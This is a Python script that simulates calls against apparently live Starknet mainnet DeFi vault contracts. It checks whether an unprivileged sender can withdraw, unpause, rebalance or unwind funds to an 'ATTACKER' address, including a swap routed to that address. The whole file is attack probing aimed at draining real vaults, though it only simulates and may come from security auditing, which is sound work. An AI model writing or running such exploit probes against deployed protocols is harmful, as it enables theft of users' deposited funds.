#!/usr/bin/env python3
"""Follow-up probes: exact claim payment, position-gating of withdraw/rebalance,
unpause/locked access, unwind_dapp2 with correct u256 encoding."""
import json

from rpc import felt, rpc, selector

from simulate_extended import (
    AC_STRK, AC_USDC, S_STRK, S_USDC, S_ETH, S_ETH_XL,
    ATTACKER, AC_OWNER, S_OWNER, STRK, USDC, ETH,
    enc_swap, enc_claim, simulate, analyze, get_random_sender, u256,
)

CARTRIDGE = "https://api.cartridge.gg/x/starknet/mainnet"


def main():
    sender = get_random_sender()
    results = {"random_sender": sender}
    swap = enc_swap(STRK, 10**18, USDC, 0, 0, ATTACKER, 0, "0x0", [])
    plan = [
        # exact payment for a dust position (single call, AC_owner is a real claimant on Sensei vaults)
        ("single_claim_S_STRK_AC_owner", AC_OWNER, [(S_STRK, "withdraw_zklend", [hex(1), hex(0), felt(AC_OWNER)])]),
        ("single_claim_S_USDC_AC_owner", AC_OWNER, [(S_USDC, "withdraw_zklend", [hex(1), hex(0), felt(AC_OWNER)])]),
        # unprivileged sender on other functions
        ("S_USDC withdraw(1,attacker,0)", sender, [(S_USDC, "withdraw", [hex(1), hex(0), felt(ATTACKER), hex(0)])]),
        ("S_USDC rebalance(1,false)", sender, [(S_USDC, "rebalance", [hex(1), hex(0), hex(0)])]),
        ("S_USDC unpause()", sender, [(S_USDC, "unpause", [])]),
        ("S_STRK unpause()", sender, [(S_STRK, "unpause", [])]),
        ("S_USDC locked(0,[])", sender, [(S_USDC, "locked", [hex(0), hex(0)])]),
        ("S_USDC unwind_dapp2(10000,attacker-swap)", sender, [(S_USDC, "unwind_dapp2", [*u256(10000), *swap])]),
        ("S_USDC withdraw_nostra(attacker) full", sender, [(S_USDC, "withdraw_nostra", [felt(ATTACKER)])]),
        ("AC_STRK withdraw_zklend(1,attacker)", sender, [(AC_STRK, "withdraw_zklend", [hex(1), hex(0), felt(ATTACKER)])]),
    ]
    for label, snd, calls in plan:
        try:
            r = simulate(snd, calls)
            results[label] = analyze(r[0])
        except Exception as e:  # noqa: BLE001
            results[label] = {"status": "SIM_ERROR", "error": str(e)[:400]}
    print(json.dumps(results, indent=1))


if __name__ == "__main__":
    main()
